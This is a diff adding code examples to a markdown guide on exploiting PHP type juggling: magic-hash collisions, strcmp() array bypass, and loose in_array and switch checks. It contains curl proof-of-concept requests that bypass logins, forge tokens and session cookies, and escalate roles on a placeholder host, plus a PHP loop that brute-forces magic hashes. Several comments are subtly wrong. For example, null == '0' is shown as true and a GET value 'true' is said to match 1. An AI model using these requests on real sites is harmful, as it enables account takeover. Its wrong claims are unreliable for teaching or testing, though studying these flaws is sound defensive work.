@@ -59,10 +59,20 @@ PHP has two equality operators with fundamentally different behavior:
 
 Compares both **value** and **type** without coercion:
 
+```php
+var_dump("1" === 1);        // bool(false) — string vs int
+var_dump("0e123" === "0e456"); // bool(false) — string vs string
+```
 
 ### Loose Comparison (`==`)
 
 Applies PHP's type coercion rules before comparing values. This is where vulnerabilities arise:
+
+```php
+var_dump("1" == 1);         // bool(true) — string coerced to int
+var_dump("0e123" == "0e456"); // bool(true) — both parse as float 0
+var_dump("" == null);       // bool(true)
+```
 
 
 ### PHP 8.0 Changes
@@ -82,8 +92,17 @@ When PHP encounters a string in a numeric context (comparison with `==` to anoth
 
 If both strings start with `"0e"` followed by only digits, PHP treats them both as the number `0`:
 
+```php
+var_dump("0e462097431906509019562988736854" == "0e830400451993494058024219903391");
+// bool(true) — 0 × 10^46209... == 0 × 10^83040...
+```
 
 **Critical distinction**: This only works when the string is **purely numeric** after `"0e"`. If there are trailing non-numeric characters, PHP does not treat it as scientific notation:
+
+```php
+var_dump("0e123" == "0eabc"); // bool(false) — "0eabc" is a plain string
+var_dump("0e123" == "0");     // bool(true)  — both numeric
+```
 
 
 ### Common Magic Hashes by Hash Algorithm
@@ -124,6 +143,11 @@ PHP's loose comparison triggers magic hash behavior when both sides are numeric-
 
 **Vulnerable pattern:**
 
+```php
+if (md5($input_password) == $stored_hash) {
+    $authenticated = true;
+}
+```
 
 **Attack:**
 - If `$stored_hash` starts with `"0e"` followed by only digits, send a magic hash input
@@ -132,10 +156,27 @@ PHP's loose comparison triggers magic hash behavior when both sides are numeric-
 
 **Proof of concept:**
 
+```bash
+# Verify the stored hash is a magic hash first (32 hex chars, 0e + digits only)
+php -r 'var_dump(md5("240610708"));'   # string(32) "0e462097431906509019562988736854"
+php -r 'var_dump("0e462097431906509019562988736854" == "0e830400451993494058024219903391");'
+# bool(true)
+
+# Send any magic-hash-producing input as the password — all collide to 0
+curl -sS -X POST https://target.com/login \
+  -d 'username=admin&password=240610708' -i
+# Any of QNKCDZO / aabC9RqS / s878926199a works identically
+```
+
 ### Token Forgery
 
 **Vulnerable pattern:**
 
+```php
+if (md5($_GET['token']) == $expected_token) {
+    grant_access();
+}
+```
 
 **Attack:**
 1. Determine or guess the hash algorithm (likely `md5()` based on output length)
@@ -143,8 +184,23 @@ PHP's loose comparison triggers magic hash behavior when both sides are numeric-
 3. Send it as the token parameter
 4. If `$expected_token` happens to be a magic hash, access is granted
 
+```bash
+curl -sS "https://target.com/verify?token=QNKCDZO"
+```
+
 ### Session Validation Bypass
 
+```php
+// Vulnerable: cookie token loosely compared against stored token hash
+if (md5($_COOKIE['session_token']) == $_SESSION['token_hash']) {
+    $valid_session = true;
+}
+```
+
+```bash
+# Replay with a magic-hash input in the session cookie
+curl -sS https://target.com/account -H 'Cookie: session_token=s155964671a' -i
+```
 
 Same technique — forge a magic hash cookie that loosely equals the expected hash.
 
@@ -154,12 +210,39 @@ Same technique — forge a magic hash cookie that loosely equals the expected ha
 
 When a string is compared with a number using `==`:
 
+```php
+var_dump("10" == 10);      // bool(true)
+var_dump("1e1" == 10);     // bool(true) — scientific notation
+var_dump("  10  " == 10);  // bool(true) — leading/trailing whitespace trimmed (PHP <8.0)
+var_dump("0x1A" == 26);    // bool(false) in PHP 7+ — hex literals no longer coerced
+var_dump("abc" == 0);      // bool(true) PHP <8, bool(false) PHP >=8
+```
 
 ### Boolean Coercion
 
+```php
+var_dump("admin" == true);   // bool(true) — any non-empty string is truthy
+var_dump("" == false);       // bool(true)
+var_dump("0" == false);      // bool(true) — "0" is the one falsy string
+var_dump([1] == true);       // bool(true) — non-empty array truthy
+```
+
+**Attack surface:** `if ($user_input == true)` accepts ANY non-empty string — including `"false"`:
+
+```php
+var_dump("false" == true);   // bool(true)!
+```
 
 ### Null Coercion
 
+```php
+var_dump(null == false);   // bool(true)
+var_dump(null == "");      // bool(true)
+var_dump(null == 0);       // bool(true)
+var_dump(null == "0");     // bool(true)
+```
+
+**Attack:** omitting a parameter entirely (null) can satisfy checks written as `if ($token != $expected && $token == 0)`-style logic, or bypass `empty()`-based guards that conflate null with valid falsy values.
 
 ### Type Juggling Quick Reference Table
 
@@ -185,12 +268,30 @@ When a string is compared with a number using `==`:
 
 ### Empty Array as False
 
+```php
+var_dump([] == false);   // bool(true)
+if ($errors == false) { /* passes when $errors is an empty array */ }
+```
 
 ### Non-Empty Array
 
+```php
+var_dump([0] == true);    // bool(true)
+var_dump([""] == true);   // bool(true) — any non-empty array is truthy
+```
 
 ### Array in Comparison Chains
 
+```php
+// Loose comparison of arrays: equal if same key/value pairs (order-insensitive for ==)
+var_dump(["a" => 1, "b" => 2] == ["b" => 2, "a" => 1]); // bool(true)
+
+// An array NEVER equals a scalar string with ===, but watch switch/in_array paths
+var_dump([] == 0);       // bool(true) PHP <8
+var_dump([] == "");      // bool(true) PHP <8
+```
+
+**Attack:** sending `param[]` (array) where a string secret is expected flips comparisons — this feeds directly into the `strcmp()` bypass below.
 
 ## 8. `strcmp()` Bypass
 
@@ -198,12 +299,23 @@ PHP's `strcmp()` compares two strings and returns `0` if equal, non-zero otherwi
 
 ### The NULL Return Vulnerability
 
+```php
+// Vulnerable: loose comparison of strcmp's return value
+if (strcmp($_POST['password'], $stored_password) == 0) {
+    $authenticated = true;
+}
+```
 
 **Why this matters:**
 
 
 If `$input` is an array (via `password[]=anything` in POST), `strcmp()` returns `NULL`:
 
+```php
+var_dump(strcmp([], "secret") == 0);
+// Warning: strcmp() expects parameter 1 to be string, array given
+// bool(true) — NULL == 0 is true in PHP <8
+```
 
 **The attacker authenticates without knowing the password.**
 
@@ -212,8 +324,23 @@ If `$input` is an array (via `password[]=anything` in POST), `strcmp()` returns 
 
 The server returns a valid session or authentication token because `strcmp(array(), "hash") == 0` evaluates as `true`.
 
+```bash
+# Send the password parameter as an array — bracket notation forces array type
+curl -sS -X POST https://target.com/login \
+  -d 'username=admin&password[]=x' -i
+
+# JSON APIs: send a non-string type where the code expects a string
+curl -sS -X POST https://target.com/api/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":[]}' -i
+```
+
 ### `strncmp()` Variant
 
+```php
+var_dump(strncmp([], "secret", 6) == 0);
+// bool(true) — same NULL-return-on-array behavior
+```
 
 Same vulnerability — passing an array returns `NULL`, which loosely equals `0`.
 
@@ -227,6 +354,13 @@ Same pattern applies to multibyte and case-insensitive variants.
 
 The most powerful type juggling attack: two different inputs whose `md5()` outputs are both magic hashes.
 
+```php
+// Two different inputs, two different hashes — yet loosely equal:
+var_dump(md5("240610708") == md5("QNKCDZO"));
+// md5("240610708") = "0e462097431906509019562988736854"
+// md5("QNKCDZO")   = "0e830400451993494058024219903391"
+// bool(true) — both parse as float 0
+```
 
 ### Hash Algorithm Detection
 
@@ -247,6 +381,16 @@ To exploit, first determine which hash algorithm the server uses:
 
 ### Generating Custom Magic Hashes
 
+```bash
+# Brute-force numeric inputs for MD5 magic hashes (0e followed by digits only)
+php -r 'for ($i = 0; $i < 50000000; $i++) { $h = md5($i); if (substr($h, 0, 2) === "0e" && ctype_digit(substr($h, 2))) { echo "$i => $h\n"; } }'
+
+# Same sweep for SHA1
+php -r 'for ($i = 0; $i < 50000000; $i++) { $h = sha1($i); if (substr($h, 0, 2) === "0e" && ctype_digit(substr($h, 2))) { echo "$i => $h\n"; } }'
+
+# Quick sanity check of a candidate input
+php -r 'var_dump(md5("240610708"), sha1("10932435112"));'
+```
 
 ### Precomputed Magic Hash Lists
 
@@ -270,12 +414,34 @@ PHP's `switch` statement uses loose comparison internally:
 
 ### Type Juggling in Switch
 
+```php
+switch ($role) {
+    case "admin":  grant_admin(); break;
+    case "user":   grant_user();  break;
+}
+// switch uses == internally: $role = true matches the FIRST case ("admin")
+// because true == "admin" is bool(true)
+```
 
 ### Switch with Integer 0
 
+```php
+switch ($level) {
+    case 0:  echo "guest"; break;
+    case 1:  echo "user";  break;
+}
+// PHP <8: $level = "guest" (non-numeric string) coerces to 0 → matches case 0
+// PHP >=8: only numeric strings coerce; "guest" falls through
+```
 
 ### Switch on Hash Comparison
 
+```php
+switch (md5($input)) {
+    case $admin_hash: grant_admin(); break;   // loose == per case
+}
+// If $admin_hash is a magic hash and md5($input) is a magic hash → match
+```
 
 If `$admin_hash` is a magic hash and `$input`'s md5 is also a magic hash, they match.
 
@@ -283,24 +449,53 @@ If `$admin_hash` is a magic hash and `$input`'s md5 is also a magic hash, they m
 
 `in_array()` checks if a value exists in an array. Without the `strict` parameter set to `true`, it uses loose comparison:
 
+```php
+$allowlist = [100, 200, 300];
+var_dump(in_array("1e2", $allowlist));        // bool(true) — "1e2" == 200
+var_dump(in_array(true, $allowlist));         // bool(true) — any non-empty value
+var_dump(in_array("100abc", $allowlist));     // bool(false) PHP >=8, true PHP <8
+var_dump(in_array("200", $allowlist, true));  // bool(false) — strict mode saves it
+```
 
 ### Attack Scenarios
 
 **Role Bypass:**
 
+```php
+// Vulnerable: integer allowlist checked loosely
+if (in_array($_GET['role'], [1, 2, 3])) {
+    grant_elevated_access();
+}
+```
 
-
+```bash
+# role=true matches case 1 (true == 1); role=1e2 matches case 2 in PHP <8
+curl -sS "https://target.com/dashboard?role=true" -i
+curl -sS "https://target.com/dashboard?role=2e0" -i   # 2e0 == 2 → elevated tier
+```
 
 The attacker gains access with role "admin" even though only integers are in the allowlist.
 
 **Numeric String Bypass:**
 
+```php
+var_dump(in_array("1e2", [100])); // bool(true) — scientific notation equals the int
+```
 
 ### Fix: Always Use Strict Mode
 
+```php
+// Safe: third parameter enforces type + value equality
+in_array($role, [1, 2, 3], true);
+```
 
 ### `array_search()` Same Vulnerability
 
+```php
+$key = array_search("1e2", [100, 200]);
+var_dump($key); // int(0) — matched loosely, returns the index not a bool
+if ($key !== false) { /* loose match accepted */ }
+```
 
 If `$key` is used for array indexing or conditional logic, this can cause unintended behavior.
 
@@ -308,18 +503,45 @@ If `$key` is used for array indexing or conditional logic, this can cause uninte
 
 ### Ternary Operator Coercion
 
+```php
+// Ternary uses loose boolean evaluation of the condition
+$access = ($_GET['premium']) ? true : false;
+// ?premium=false → string "false" is truthy → $access = true
+```
 
 ### Loose Comparison in Conditionals
 
+```php
+if ($_GET['debug'] == 1) { enable_debug(); }
+// debug=1e0, debug=01, debug=" 1" all coerce to 1 (PHP <8 whitespace rule)
+```
 
 ### PHP `filter_var()` Type Juggling
 
+```php
+var_dump(filter_var("1", FILTER_VALIDATE_BOOLEAN)); // bool(true)
+var_dump(filter_var("on", FILTER_VALIDATE_BOOLEAN)); // bool(true)
+var_dump(filter_var([], FILTER_VALIDATE_BOOLEAN));   // bool(false), no error
+// Arrays bypass FILTER_VALIDATE_* string checks entirely — validate types first
+```
 
 ### Object Coercion (PHP 7.4+)
 
+```php
+$obj = new stdClass();
+var_dump($obj == true);  // bool(true) — objects are always truthy
+// JSON body {"user": {}} deserialized as object satisfies == true guards
+```
 
 ### `isset()` vs `empty()` vs Loose Comparison
 
+```php
+$s = "0";
+isset($s);   // true — variable exists and is not null
+empty($s);   // true — "0" is one of empty's falsy values ("", 0, "0", null, false, [])
+$s == false; // true — loose comparison agrees with empty here
+$s === "";   // false — but strict check reveals the actual value is "0"
+```
 
 ## 13. Anti-Hallucination
 
